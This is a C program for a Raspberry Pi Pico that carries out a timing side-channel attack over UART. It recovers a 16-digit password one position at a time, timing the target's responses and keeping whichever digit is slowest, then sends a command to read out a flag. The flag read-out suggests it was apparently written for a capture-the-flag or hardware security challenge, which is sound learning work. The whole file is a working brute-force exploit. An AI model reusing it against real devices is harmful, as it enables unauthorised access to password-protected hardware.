#include <stdio.h>
#include "pico/stdlib.h"
#include "hardware/gpio.h"
#include <string.h>

#include "hardware/structs/systick.h"

uint32_t times[4096] = {0};
uint32_t times_i = 0;

#define TIME_PER_BIT 13020
#define HALF_TIME_PER_BIT 6510

void gpio_interrupt(uint gpio, uint32_t event_mask)
{
	uint32_t time = systick_hw->cvr;

	if (times_i < 4096)
	{
		times[times_i++] = time;
	}
}

uint8_t target[20] = {1, 2, 1, 2, 3, 1, 1, 2, 1, 1, 1, 1, 2, 4, 1, 2, 1, 1, 1, 4};

#define uart_periph uart1
#define TX_PIN 8
#define RX_PIN 9

uint32_t guess_password(char *pw)
{
	times_i = 0;

	sleep_ms(50);

	uart_write_blocking(uart_periph, "d\n", 2);
	while (uart_get_hw(uart_periph)->fr & UART_UARTFR_BUSY_BITS)
	{
		tight_loop_contents();
	}
	sleep_ms(50);

	gpio_set_irq_enabled_with_callback(RX_PIN, GPIO_IRQ_EDGE_FALL | GPIO_IRQ_EDGE_RISE, true, gpio_interrupt);

	uart_write_blocking(uart_periph, pw, strlen(pw));
	uart_write_blocking(uart_periph, "\n", 1);
	while (uart_get_hw(uart_periph)->fr & UART_UARTFR_BUSY_BITS)
	{
		tight_loop_contents();
	}
	sleep_ms(50);

	gpio_set_irq_enabled_with_callback(RX_PIN, GPIO_IRQ_EDGE_FALL | GPIO_IRQ_EDGE_RISE, false, gpio_interrupt);

	if (times_i > 22)
	{
		for (int i = 0; i < times_i - 21; i += 1)
		{
			int match = 1;
			for (int j = 0; j < 20; j++)
			{
				uint32_t diff = (times[i + j] - times[i + j + 1]) & 0xFFFFFF;
				uint32_t bauds = ((diff + HALF_TIME_PER_BIT) / TIME_PER_BIT);
				if (bauds != target[j])
				{
					match = 0;
					break;
				}
			}
			if (match)
			{
				return ((times[i + 20] - times[i + 21]) & 0xFFFFFF);
			}
		}
	}
	return 0xFFFFFFFF;
}

char *candidates = "0123456789";

void on_uart_interrupt()
{
	printf("%c", uart_get_hw(uart_periph)->dr); // receive
}

int main()
{
	stdio_init_all();

	systick_hw->csr = 0x5;
	systick_hw->rvr = 0x00FFFFFF;

	gpio_init(RX_PIN);
	gpio_disable_pulls(RX_PIN);
	gpio_set_dir(RX_PIN, GPIO_IN);

	uart_init(uart_periph, 9600);
	gpio_set_function(TX_PIN, GPIO_FUNC_UART);

	sleep_ms(1000);

	char password[17] = {0};

	for (int position = 0; position < 16; position++)
	{
		uint32_t slowest_time = 0;
		char slowest_char = '?';
		for (int candidate_idx = 0; candidate_idx < strlen(candidates); candidate_idx++)
		{
			char candidate = candidates[candidate_idx];
			password[position] = candidate;

			uint32_t time_for_char = guess_password(password);
			if (time_for_char == 0xFFFFFFFF)
			{
				sleep_ms(500);
				time_for_char = guess_password(password);
			}
			if (time_for_char == 0xFFFFFFFF)
			{
				sleep_ms(500);
				uart_write_blocking(uart_periph, "\n", 1);
				sleep_ms(500);
				time_for_char = guess_password(password);
			}

			printf("%s %d\n", password, time_for_char);
			if (time_for_char != 0xFFFFFFFF && time_for_char > slowest_time)
			{
				slowest_time = time_for_char;
				slowest_char = candidate;
			}
		}
		printf("position %d is %c\n", position, slowest_char);
		password[position] = slowest_char;
	}

	// Read out flag
	gpio_set_function(RX_PIN, GPIO_FUNC_UART);

	irq_set_exclusive_handler((uart_periph == uart1 ? UART1_IRQ : UART0_IRQ), on_uart_interrupt);
	irq_set_enabled((uart_periph == uart1 ? UART1_IRQ : UART0_IRQ), true);

	uart_set_irq_enables(uart_periph, true, false);

	while (true)
	{
		sleep_ms(500);
		uart_write_blocking(uart_periph, "f\n", 2);
		sleep_ms(500);

		exit(0);
	}
}
